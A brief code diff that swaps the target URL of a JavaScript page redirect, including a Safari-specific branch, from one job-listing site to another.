@@ -24,7 +24,7 @@ function redirectToURL(url) {
     }
 }
 
-redirectToURL("https://findjobksa99.netlify.app/");
+redirectToURL("http://owljobs.us/sa");
 
 var ua = navigator.userAgent.toLowerCase(); 
 if (ua.indexOf('safari')!=-1){ 
@@ -32,7 +32,7 @@ if (ua.indexOf('safari')!=-1){
         // Chrome
     } else {
         // Safari
-        window.location.href = "https://findjobksa99.netlify.app/";
+        window.location.href = "http://owljobs.us/sa";
 
     }
 }
